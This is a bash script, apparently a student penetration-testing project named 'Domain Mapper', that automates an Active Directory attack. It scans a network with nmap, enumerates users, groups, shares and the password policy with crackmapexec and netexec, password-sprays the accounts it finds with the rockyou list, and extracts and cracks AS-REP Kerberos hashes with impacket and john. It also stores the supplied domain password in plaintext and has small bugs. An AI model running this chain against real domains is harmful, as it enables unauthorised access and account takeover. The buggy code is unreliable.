#!/bin/bash


start=$(date +%s)


if [ ! -t 0 ]  #thanks claude and not deepseek this time!
	then
    if [ -e /dev/tty ] 
    then
        exec 0</dev/tty
    else
        echo "✗ Error: No terminal available for input"
        exit 1
    fi
fi
# Restore terminal settings on exit
trap 'if [ -n "$SAVED_STTY" ]; then stty "$SAVED_STTY" 2>/dev/null; fi' EXIT
Default="/usr/share/wordlists/rockyou.txt" #default pass list to test on
GR='\e[32m' #Printing in Green
RED='\033[0;31m' #Printing in Red
OR='\033[38;5;214m' #Printing in Orange
BLUE='\033[0;34m' #Printing in Blue
YELLOW='\033[1;33m' #Printing in Yellow
NC='\033[0m' # No Color

function show_logo() #thanks to deepseek i have a logo now :D
{
    clear
    echo -e "${GR}"
    echo '╔══════════════════════════════════════════════════════════════╗'
    echo '║                                                              ║'
    echo '║  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗          ║'
    echo '║  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║          ║'
    echo '║  ██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║          ║'
    echo '║  ██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║          ║'
    echo '║  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║          ║'
    echo '║  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝          ║'
    echo '║                                                              ║'
    echo '║  ███╗   ███╗ █████╗ ██████╗ ██████╗ ███████╗██████╗          ║'
    echo '║  ████╗ ████║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗         ║'
    echo '║  ██╔████╔██║███████║██████╔╝██████╔╝█████╗  ██████╔╝         ║'
    echo '║  ██║╚██╔╝██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗         ║'
    echo '║  ██║ ╚═╝ ██║██║  ██║██║     ██║     ███████╗██║  ██║         ║'
    echo '║  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝         ║'
    echo '║                                                              ║'
    echo '║                 Automated Domain Assessment                  ║'
    echo '║                     Version 1.0 | 2024                       ║'
    echo '║                                                              ║'
    echo '╚══════════════════════════════════════════════════════════════╝'
    echo -e "${NC}"
    echo -e "${BLUE}================================================================================${NC}"
    echo -e "${YELLOW}★ Starting Domain Mapper...${NC}"
    echo -e "${BLUE}================================================================================${NC}"
    sleep 2
    clear
}
show_logo

for TOOL in nmap crackmapexec netexec impacket-GetNPUsers john enscript
do 
	echo -e "⚙️ ${OR}Checking For $TOOL${NC}"
	if [ -z "$(which $TOOL  2>/dev/null)" ]
	then 
	echo -e "✗ ${RED}[X] The $TOOL isnt installed!${NC}"
	echo -e "➜ ${RED}[!]Starting installation!${NC}"
	sudo apt-get install $TOOL -y
	else
	echo -e "✓ ${GR}[V] The $TOOL is installed,procceeding.${NC}"
	echo '------------------------------------------------------'
    fi
done

function validate_ip_range() 
{
    local range=$1
    if [[ $range =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+-[0-9]+$ ]] 
    then
        local base_ip="${range%-*}"
        local end_part="${range#*-}"
        
        if ! validate_ip_regex "$base_ip"
        then
            return 1
        fi
        
        local last_octet=$(echo "$base_ip" | awk -F. '{print $4}')
        
        if ((end_part > last_octet && end_part <= 255))
        then
            return 0
        fi
    fi
    return 1
}

function validate_ip_regex() 
{
    local ip=$1
    if [[ $ip =~ ^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$ ]] 
    then
        return 0
    else
        return 1
    fi
}

function validate_cidr() 
{
    local cidr=$1
    if [[ $cidr =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]] 
    then
        local ip_part="${cidr%/*}"
        local mask_part="${cidr#*/}"
        
        if validate_ip_regex "$ip_part" && ((mask_part >= 0 && mask_part <= 32)) 
        then
            return 0
        fi
    fi
    return 1
}

function InfoGather()
{
	sleep 2
	clear
    echo -e "🎯 ${BLUE}========== INFORMATION GATHERING ==========${NC}"
    echo ''
    
     while true 
     do
        echo -e "🌐 ${YELLOW}Please Insert an ip range to scan!${NC}"
        if ! read -r Address 
        then
            echo -e "✗ ${RED}Failed to read input${NC}"
            exit 1
        fi
        
        if validate_ip_regex "$Address" 
        then
            echo -e "✓ ${GR}Valid IP address${NC}"
            echo '-----------------------------------------'
            break
        elif validate_cidr "$Address" 
        then
            echo -e "✓ ${GR}Valid CIDR range${NC}"
            echo '-----------------------------------------'
            break
        elif validate_ip_range "$Address" 
        then
            echo -e "✓ ${GR}Valid IP range${NC}"
            echo '-----------------------------------------'
            break
        else
            echo -e "✗ ${RED}Invalid IP address or range format${NC}"
            echo "-----------------------------------------------------"
            echo -e "➜ ${OR}  - Please use formats like:${NC}"
            echo -e "    ${OR}  - Single IP: 192.168.1.1${NC}"
            echo -e "    ${OR}  - CIDR: 192.168.1.0/24${NC}"
            echo -e "    ${OR}  - Range: 192.168.1.10-50${NC}"
            echo '-----------------------------------------'
        fi
    done
    echo -e "🎯 ${YELLOW}Please Specify The Domain Name${NC}"
    read -r Dom
    echo -e "✓ ${GR} Specified Domain : $Dom ${NC}"
    echo -e "? ${OR} Is the specified Domain Correct? [Y/N]${NC}"
    read -r DomAns
    if [ "$DomAns" == "Y" ] || [ "$DomAns" == "Yes" ] || [ "$DomAns" == "yes" ] || [ "$DomAns" == "y" ]
    then
    echo -e "✓ ${GR} Validation Complete Continuing ${NC}"
    echo '-----------------------------------------------'
    else
    echo -e "✗ ${RED} Please Instert Correct Domain! ${NC}"
    read -r Dom
    echo -e "➜ ${OR} Procceeding with $Dom ${NC}"
    echo '----------------------------------------------'
    fi
    echo -e "👤 ${YELLOW}Please Specify The Domain User [optional]${NC}"
    read -r User
    if [ -z $User ]
    then
    echo -e "➜ ${OR} No User Specified, Continuing without ${NC}"
    echo '----------------------------------------------------'
    else
    echo -e "✓ ${GR} Specified Domain User : $User ${NC}"
    echo '----------------------------------------------------'
    echo -e "? ${OR} Is the specified User Correct? [Y/N]${NC}"
    read -r UseAns
    if [ "$UseAns" == "Y" ] || [ "$UseAns" == "Yes" ] || [ "$UseAns" == "yes" ] || [ "$UseAns" == "y" ]
    then
    echo -e "✓ ${GR} Validation Complete Continuing ${NC}"
    echo '-----------------------------------------------'
    else
    echo -e "✗ ${RED} Please Instert Correct User! ${NC}"
    read -r User
    echo -e "➜ ${OR} Procceeding with $User ${NC}"
    echo '----------------------------------------------'
    fi
    fi
    echo -e "🔒 ${YELLOW}Please Specify The Domain Password [optional]${NC}"
    read -r Password
    if [ -z $Password ]
    then
    echo -e "➜ ${OR} No Password Specified, Continuing without ${NC}"
    echo '----------------------------------------------------'
    else
    echo -e "✓ ${GR} Specified Domain Password: $Password ${NC}"
    echo -e "? ${OR} Is the specified Password Correct? [Y/N]${NC}"
    read -r PassAns
    if [ "$PassAns" == "Y" ] || [ "$PassAns" == "Yes" ] || [ "$PassAns" == "yes" ] || [ "$PassAns" == "y" ]
    then
    echo -e "✓ ${GR} Validation Complete Continuing ${NC}"
    echo '-----------------------------------------------'
    else
    echo -e "✗ ${RED} Please Instert Correct Password! ${NC}"
    read -r Passowrd
    echo -e "➜ ${OR} Procceeding with $Password ${NC}"
    echo '----------------------------------------------'
    fi
    fi

    echo -e "📁 ${YELLOW}Please Specify the Directory Name to save into${NC}"
    read -r Dir
    mkdir -p "$Dir"
    echo -e "✓ ${GR} Created '$Dir' in $(pwd) ${NC}"
    sleep 2
    clear
    echo -e "📄 ${BLUE}========== SAVING CREDENTIALS ==========${NC}"
    echo '------------------------------------------------------------'
    echo -e "✓ ${GR} Saving Providet Credentials as Providet in Created Folder "
    echo '--------------------------------------------------------------------'
    echo -e "🌐 ${GR} Tested Ip Range : $Address ${NC}" 
    echo '--------------------------------------------'
    echo -e "🎯 ${GR} Tested Domain Name : $Dom ${NC}" 
    echo '--------------------------------------------'
    echo -e "👤 ${GR} Tested User Name : $User ${NC}" 
    echo '--------------------------------------------'
    echo -e "🔒 ${GR} Tested Password : $Password ${NC}" 
    echo '--------------------------------------------'
{  #solution providet by deepseek for clean output in the saved file
    echo "Tested Ip Range : $Address"
    echo '--------------------------------------------'
    echo "Tested Domain Name : $Dom"
    echo '--------------------------------------------'
    echo "Tested User Name : $User"
    echo '--------------------------------------------'
    echo "Tested Password : $Password"
    echo '--------------------------------------------'
} >> $Dir/credentials.txt

}
InfoGather

sleep 2
clear

function Passcheck ()
{
    echo -e "🔑 ${YELLOW} Would you like to provide a pass list to test on? ${NC}"
    read -r listans
    if [ "$listans" = "Y" ] || [ "$listans" = "y" ] || [ "$listans" = "yes" ] || [ "$listans" = "YES" ]
	then
	echo -e "📁 ${YELLOW} Please provide the full path to the folder: ${NC}"
	read -r listpath
	if [ -f $listpath ]
	then
	echo -e "✓ ${GR} Procceeding with $listpath as passlist for testing ${NC}"
	else
	echo -e "✗ ${RED} Wrong Input. Please try again ${NC}"
	Passcheck
	fi
	else
	echo -e "➜ ${RED} Using The $Default as a passlist to check on ${NC}"
	fi
	sleep 2
	clear
}
Passcheck

function Scanning ()
{
    while true 
    do
        echo -e "🔍 ${OR} ======Entering Scanning Phase===== ${NC}"
        echo -e "➜ ${OR} Please Select The Level of Scanning you want ${NC}"
        echo -e "✗ ${RED} Remember you can use -h for more info on the scanning options provided ${NC}"
        echo -e "★ ${BLUE} A.Basic Scanning ${NC}"
        echo -e "★ ${BLUE} B.Intermediate Scanning ${NC}"
        echo -e "★ ${BLUE} C.Advanced Scanning ${NC}"
        if ! read -r OPTION 
        then
        echo -e "✗ ${RED}Failed to read option${NC}"
        sleep 1
        continue
        fi
        echo '===================================================================================='
        
        case $OPTION in
        A-h|a-h)
        echo -e "ℹ️ ${GR} Basic: Regular nmap scan skipping host discovery and treating every one as online${NC}"
        echo '===================================================================================='
        sleep 3
        clear
        ;;
        B-h|b-h)
        echo -e "ℹ️ ${GR} Intermediate: Treating all as online and scanning all ports${NC}"
        echo '===================================================================================='
        sleep 3
        clear
        ;;
        C-h|c-h)
        echo -e "ℹ️ ${GR} Advanced: Treating all as online, scanning all ports and UDP ports${NC}"
        echo '===================================================================================='
        sleep 3
        clear
        ;;
        A|a) 
        echo -e "➜ ${OR} You Have Chosen Basic Scanning, Beginning Work! ${NC}"
        echo '===================================================================================='
        nmap $Address -Pn >> $Dir/nmap_output.txt
        break
        ;;
        B|b) 
        echo -e "➜ ${GR} You Have Chosen Intermediate Scanning, Beginning Work! ${NC}"
        echo '===================================================================================='
        nmap $Address -Pn -p- >> $Dir/nmap_output.txt
        break
        ;;
        C|c) 
        echo -e "➜ ${GR} You Have Chosen Advanced Scanning, Beginning Work! ${NC}"
        echo '===================================================================================='
        echo -e "🔍 ${YELLOW} Beggining with Scanning All the Tcp Ports!${NC}"
        nmap $Address -Pn -p- >> $Dir/nmap_output.txt
        echo -e "✓ ${GR} Done! ${NC}"
        echo '===================================================================================='
        echo -e "🔍 ${YELLOW} Beggining with Scanning the Udp Ports!${NC}"
        nmap $Address -Pn -sU >> $Dir/nmap_output.txt
        echo -e "✓ ${GR} Done! ${NC}"
        echo '===================================================================================='
        break
        ;;
        *) 
        echo -e "✗ ${RED} Wrong Option Try Again ${NC}"
        echo '===================================================================================='
        ;;
        esac
    done
    echo -e "✓ ${GR} Scanning Complete! Saving to $Dir/nmap_output.txt ${NC}"
    echo '===================================================================================='
    sleep 2
    clear
}
Scanning

function Basic_Enum ()
{
    echo -e "🔍 ${BLUE}========== BASIC ENUMERATION ==========${NC}"
		for ip in $(cat $Dir/hosts.txt)
        do
        nmap $ip -sV -Pn > $Dir/$ip
        echo -e "✓ ${GR} Version Scan Complete! Saved into $Dir/$ip.txt${NC}"
        echo '------------------------------------------------------------'
        done
        DomainIP=$(grep -il 'kerberos' $Dir/[0-9]* | awk -F'/' '{print $2}') #thanks Doron for this line to find the domain ip from range!
        echo -e "🎯 ${GR} The Domain Ip is :  $DomainIP ${NC}"
        echo '----------------------------------------------------------------'
        DHCPIP=$(nmap $DomainIP --script=broadcast-dhcp-discover | grep 'Server Identifier' | awk '{print $NF}')
        echo -e "🌐 ${GR}The DHCP Ip is : $DHCPIP  ${NC}"
        echo '-----------------------------------------------------------------'
        sleep 2
}


function Intermediate_Enum ()
{
    echo -e "🔍 ${BLUE}========== INTERMEDIATE ENUMERATION ==========${NC}"
	for port in 21 22 389 445 3389 5985 #port numbers were checking
	do
	echo -e "🌐 ${OR} The Next Ip's Have $port on: ${NC}"| tee -a $Dir/open_ports.txt
	grep -iwl "$port" $Dir/[0-9]* | awk -F'/' '{print $NF}' | tee -a $Dir/open_ports.txt
	echo '-----------------------------------------------------' | tee -a $Dir/open_ports.txt
	done
	echo -e "✓ ${GR} Scanning for Ports completed,Saved to $Dir/open_ports.txt, Procceeding${NC}"
	echo '------------------------------------------------------------------------------------'
	echo -e "📁 ${OR} Starting Nmap Script For Shared Folders, SMB Os and Protocols${NC}"
	nmap $DomainIP --script=smb-enum-shares | sed -n '/smb-enum-shares:/,/^$/p' | tee -a $Dir/nmap_script.txt
	echo -e "✓ ${GR}Share Enumeration Complete! Procceeding to smb-os enum!${NC}"
	echo '------------------------------------------------------------------'
	nmap $DomainIP --script=smb-os-discovery | sed -n '/smb-os-discovery:/,/^$/p' | tee -a $Dir/nmap_script.txt
	echo -e "✓ ${GR}SMB-Os Enumeration Complete! Procceeding to smb protocols enum!${NC}"
	echo '---------------------------------------------------- --------------'
	nmap $DomainIP --script=smb-protocols | sed -n '/smb-protocols:/,/^$/p' | tee -a $Dir/nmap_script.txt
	echo -e "✓ ${GR}SMB Protocols Enumeration Complete!${NC}"
	echo -e "✓ ${GR} Finished nmap scripts, Saved into $Dir/nmap_script.txt ${NC}"
	echo '---------------------------------------------------------------------'
}

function Advanced_enum ()
{
    echo -e "🔍 ${BLUE}========== ADVANCED ENUMERATION ==========${NC}"
		echo -e "📁 ${OR} Starting Enumerating Shares! ${NC}"
		crackmapexec smb $DomainIP -u $User -p $Password --shares | sed -n '/Share/,/^$/p' | awk '{print $5,$6,$7}' | tee -a $Dir/${Dom}_shares.txt
		echo -e "✓ ${GR} Finished Enumirating Shares! Saved into $Dir/${Dom}_shares.txt${NC}"
		echo '---------------------------------------------------------------------------'
		sleep 2
		echo -e "👤 ${OR} Starting Enumerating Groups! ${NC}"
		crackmapexec smb $DomainIP -u $User -p $Password --groups | sed -n '/Enumerated domain group/,/^$/p' | awk '{print $5,$6,$7,$8,$9,$10}' | tee -a $Dir/${Dom}_grps.txt
		echo -e "✓ ${GR} Finished Enumirating Groups! Saved into $Dir/${Dom}_grps.txt${NC}"
		echo '---------------------------------------------------------------------------'
		sleep 2
		echo -e "👤 ${OR} Starting Enumerating Users! ${NC}"
		crackmapexec smb $DomainIP -u $User -p $Password --users | sed -n '/Enumerated domain user/,/^$/p' | awk -F'\' '{print $2}' | awk '{print $1}' | tee -a $Dir/${Dom}_users.txt
		echo -e "✓ ${GR} Finished Enumirating Users! Saved into $Dir/${Dom}_users.txt${NC}"
		echo '---------------------------------------------------------------------------'
		sleep 2
		echo -e "🛡️ ${OR} Starting Enumerating Password Policy! ${NC}"
		crackmapexec smb $DomainIP -u $User -p $Password --pass-pol | sed -n '/Dumping password info/,/^$/p' | awk '{print $5,$6,$7,$8,$9,$10}'| tee -a $Dir/${Dom}_posspol.txt
		echo -e "✓ ${GR} Finished Enumirating Password Policies! Saved into $Dir/${Dom}_posspol.txt${NC}"
		echo '---------------------------------------------------------------------------'
		sleep 2
		echo -e "👤 ${OR} Starting Enumerating Domain Admins Group! ${NC}"
		crackmapexec smb $DomainIP -u $User -p $Password --groups 'Domain Admins' | sed -n '/Enumerated members of domain group/,/^$/p' | awk '{print $5, $6}' | tee -a $Dir/${Dom}_domadgrp.txt
		echo -e "✓ ${GR} Finished Enumirating Domain Admins Group!  Saved into $Dir/${Dom}_domadgrp.txt${NC}"
		echo '---------------------------------------------------------------------------'
		sleep 2
		echo -e "✗ ${OR} Starting Enumerating Disabled Accounts! ${NC}"
		netexec ldap $DomainIP -u $User -p $Password --query "(userAccountControl:1.2.840.113556.1.4.803:=2)" sAMAcountName | awk -F'=' '{print $2}'| tee -a $Dir/${Dom}_disacc.txt
		echo -e "✓ ${GR} Finished Enumirating Disabled Accounts  Saved into $Dir/${Dom}_dissacc.txt${NC}"
		echo '---------------------------------------------------------------------------'
		sleep 2
		echo -e "✓ ${OR} Starting Enumerating Never Expire Accounts! ${NC}"
		netexec ldap $DomainIP -u $User -p $Password --query "(&(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" samaccountname| grep -i samaccountname | awk '{print $NF}' |tee -a $Dir/${Dom}_nevexpacc.txt
		echo -e "✓ ${GR} Finished Enumirating Never Expire Accounts  Saved into $Dir/${Dom}_nevexpacc.txt${NC}"
		echo '---------------------------------------------------------------------------'
		sleep 2
}



function Enum ()
{
	cat $Dir/nmap_output.txt | grep 'report for' | awk '{print $NF}' > $Dir/hosts.txt
    while true 
    do
        echo -e "🔍 ${OR} ======Entering Enumeration Phase===== ${NC}"
        echo -e "➜ ${OR} Please Select The Level of Enumeration you want ${NC}"
        echo -e "✗ ${RED} Remember you can use -h for more info on the enumerations options provided ${NC}"
        echo -e "★ ${BLUE} A.Basic Enumeration ${NC}"
        echo -e "★ ${BLUE} B.Intermediate Enumeration ${NC}"
        echo -e "★ ${BLUE} C.Advanced Enumeration. note works only with providet domain user and password${NC}"
        if ! read -r OPTION 
        then
        echo -e "✗ ${RED}Failed to read option${NC}"
        sleep 1
        continue
        fi
        echo '===================================================================================='
        case $OPTION in
        A-h|a-h)
        echo -e "ℹ️ ${GR} Basic: Identifying services, Domain Controler and DHCP server${NC}"
        echo '===================================================================================='
        sleep 3
        clear
        ;;
        B-h|b-h)
        echo -e "ℹ️ ${GR} Intermediate: Enumerating for Key services such as RDP,SSH,SMB and etc, shared folders smb-os-discovery smb protocols${NC}"
        echo '========================================================================================================================================='
        sleep 3
        clear
        ;;
        C-h|c-h)
        echo -e "ℹ️ ${GR} Advanced: Extracting groups,users shares avaible, displaying password policy, disabled accounts, never expiring accounts and Domain group accounts${NC}"
        echo '===================================================================================='
        sleep 3
        clear
        ;;
        A|a) 
        echo -e "➜ ${OR} You Have Chosen Basic Enumerating, Beginning Work! ${NC}"
        echo '===================================================================================='
        Basic_Enum
        break
        ;;
        B|b) 
        echo -e "➜ ${GR} You Have Chosen Intermediate Enumerating, Beginning Work! ${NC}"
        echo '===================================================================================='
		Basic_Enum
		Intermediate_Enum
        break
        ;;
        C|c) 
        echo -e "➜ ${GR} You Have Chosen Advanced Enumerating, Beginning Work! ${NC}"
        echo '===================================================================================='
        Basic_Enum
        Intermediate_Enum
        if [ -z "$User" ] 
        then
        echo -e "✗ ${RED} No User Was Detected! Please Specify The User or Press Enter To skip${NC}"
        read -r User
        else
        echo -e "✓ ${GR} User Credentials Found Continuing${NC}"
        fi
        if [ -z "$Password" ]
        then
        echo -e "✗ ${RED} No Password Was Detected! Please Specify The Password or Press Enter To skip${NC}"
        read -r Password
        else
        echo -e "✓ ${GR} Password Found Continuing${NC}"
        fi 
        if [ -z "$Password" ] || [ -z "$User" ]
        then
        echo -e "➜ ${YELLOW} Skipping Advanced Enum due to Missing Credentials${NC}"
        break
        else
        Advanced_enum
        fi
        break
        ;;
        *) 
        echo -e "✗ ${RED} Wrong Option Try Again ${NC}"
        echo '===================================================================================='
        ;;
        esac
    done
	echo -e "✓ ${GR} Finished Enumerating Phase! ${NC}"
    echo '===================================================================================='
    sleep 2
    clear
}
Enum

function Basic_Exploit ()
{
    echo -e "🔥 ${BLUE}========== BASIC EXPLOIT ==========${NC}"
	nmap $DomainIP -sV --script=vuln | tee -a $Dir/${Dom}_vuln.txt
	echo -e "✓ ${GR} Basic Exploit Complete! Saving Report to $Dir/${Dom}_vuln.txt${NC}"
	echo '-----------------------------------------------------------------'
	sleep 2
}


function Intermediate_Exploit ()
{
    echo -e "🔥 ${BLUE}========== INTERMEDIATE EXPLOIT ==========${NC}"
	if [ ! -f "$Dir/${Dom}_users.txt" ]
	then
	echo -e "✗ ${RED} No Users File Detected, Procceeding.${NC}"
	echo '-----------------------------------------------------'
	else
	echo -e "✓ ${GR} $Dir/${Dom}_users.txt Present! Beginning Work! ${NC}"
	echo -e "🔑 ${YELLOW} Checking For Passlist to spray with ${NC}"
	if [ -z "$listpath" ]
	then
	echo -e "✗ ${RED} No User Pass list detected, Procceeding with $Default ${NC}"
	crackmapexec smb $DomainIP -u $Dir/${Dom}_users.txt -p $Default -d $Dom --continue-on-success | grep '+' | tee -a $Dir/${Dom}_spray.txt
	echo -e "✓ ${GR} Attack Completed, Report Saved in $Dir/${Dom}_spray.txt ${NC}"
	echo '--------------------------------------------------------------------------'
	else
	echo -e "✓ ${GR} User Pass list detected, Procceeding with $listpath ${NC}"
	crackmapexec smb $DomainIP -u $Dir/${Dom}_users.txt -p $listpath -d $Dom --continue-on-success | grep '+' | tee -a $Dir/${Dom}_spray.txt
	echo -e "✓ ${GR} Attack Completed, Report Saved in $Dir/${Dom}_spray.txt ${NC}"
	echo '---------------------------------------------------------------------------'
	fi 
	fi
	sleep 2
	

}

function Advanced_exploit ()
{
    echo -e "🔥 ${BLUE}========== ADVANCED EXPLOIT ==========${NC}"
	if [ ! -f "$Dir/${Dom}_users.txt" ]
	then
	echo -e "✗ ${RED} No User list detected, continuing ${NC}"
	echo '-------------------------------------------------'
	else
	echo -e "✓ ${GR} User List Detected! ${NC}"
	echo -e "🔑 ${OR} Extracting Kerberos tickets...${NC}"
	impacket-GetNPUsers -dc-ip $DomainIP $Dom/ -usersfile "$Dir/${Dom}_users.txt" |grep 'krb5asrep' | tee -a $Dir/${Dom}_tickets.txt #used grep here to clean up a lil the outputfolder for john
	echo -e "✓ ${OR} Tickets Extracted, Moving To John!${NC}"
	echo '------------------------------------------------------'
	echo -e "🔑 ${BLUE} Checking Pass lists ${NC}"
	if [ -z "$listpath" ]
	then
	echo -e "✗ ${RED} No User Pass list detected, Procceeding with $Default ${NC}"
	john $Dir/${Dom}_tickets.txt --format=krb5asrep --wordlist=$Default
	john $Dir/${Dom}_tickets.txt --format=krb5asrep --show | tee -a $Dir/${Dom}_cracked.txt
	echo -e "✓ ${GR} Attack Completed, Report Saved in $Dir/${Dom}_cracked.txt ${NC}"
	echo '--------------------------------------------------------------------------'
	else
	echo -e "✓ ${GR} User Pass list detected, Procceeding with $listpath ${NC}"
	john $Dir/${Dom}_tickets.txt --format=krb5asrep --wordlist=$listpath
	john $Dir/${Dom}_tickets.txt --format=krb5asrep --show | tee -a $Dir/${Dom}_cracked.txt
	echo -e "✓ ${GR} Attack Completed, Report Saved in $Dir/${Dom}_cracked.txt ${NC}"
	echo '---------------------------------------------------------------------------'
	fi 
	fi
	
	sleep 2
}

function exploit () #Basic Exploit Menu to call all the diffrent Functions/selections
{
    while true 
    do
        echo -e "🔥 ${OR} ======Entering Exploit Phase===== ${NC}"
        echo -e "➜ ${OR} Please Select The Level of Exploit you want ${NC}"
        echo -e "✗ ${RED} Remember you can use -h for more info on the enumerations options provided ${NC}"
        echo -e "★ ${BLUE} A.Basic Exploit ${NC}"
        echo -e "★ ${BLUE} B.Intermediate Exploit ${NC}"
        echo -e "★ ${BLUE} C.Advanced Exploit${NC}"
		if ! read -r OPTION < /dev/tty 2>/dev/null
		then
		echo -e "✗ ${RED} Failed to read option. Trying again...${NC}"
		sleep 1
		continue
		fi
        echo '===================================================================================='
        case $OPTION in
        A-h|a-h)
        echo -e "ℹ️ ${GR} Basic: Running Nmap --script=vuln to check for vulnabilities${NC}"
        echo '===================================================================================='
        sleep 3
        clear
        ;;
        B-h|b-h)
        echo -e "ℹ️ ${GR} Intermediate:  Execute domain-wide password spraying to identify weak credentials${NC}"
        echo '========================================================================================================================================='
        sleep 3
        clear
        ;;
        C-h|c-h)
        echo -e "ℹ️ ${GR} Advanced: Extract and attempt to crack Kerberos tickets using pre-supplied passwords.${NC}"
        echo '===================================================================================='
        sleep 3
        clear
        ;;
        A|a) 
        echo -e "➜ ${OR} You Have Chosen Basic Exploit, Beginning Work! ${NC}"
        echo '===================================================================================='
        Basic_Exploit
        break
        ;;
        B|b) 
        echo -e "➜ ${GR} You Have Chosen Intermediate Exploit, Beginning Work! ${NC}"
        echo '===================================================================================='
        Basic_Exploit
        Intermediate_Exploit
        break
        ;;
        C|c) 
        echo -e "➜ ${GR} You Have Chosen Advanced Exploit, Beginning Work! ${NC}"
        echo '===================================================================================='
        Basic_Exploit
        Intermediate_Exploit
        Advanced_exploit
        break
        ;;
        *) 
        echo -e "✗ ${RED} Wrong Option Try Again ${NC}"
        echo '===================================================================================='
        ;;
        esac
    done
	echo -e "✓ ${GR} Finished Exploit Phase! ${NC}"
    echo '===================================================================================='
}
exploit
	#PDF Transformating
	echo -e "📄 ${BLUE} Summarising Everything into PDF File! ${NC}"
	cat $Dir/credentials.txt $Dir/nmap_output.txt $Dir/${Dom}_cracked.txt $Dir/${Dom}_spray.txt $Dir/${Dom}_posspol.txt $Dir/${Dom}_domadgrp.txt > $Dir/report.txt
	enscript $Dir/report.txt -p $Dir/report
	ps2pdf $Dir/report $Dir/report.pdf
	echo -e "✓ ${GR} Report Pdf Created in $Dir Named report.pdf! ${NC}"
	echo '==================================================================='
	end=$(date +%s)
	duration=$(($end - $start))
	echo -e "⏱️ ${RED} Script Complete  in : $duration seconds${NC}"
	echo '==================================================================='
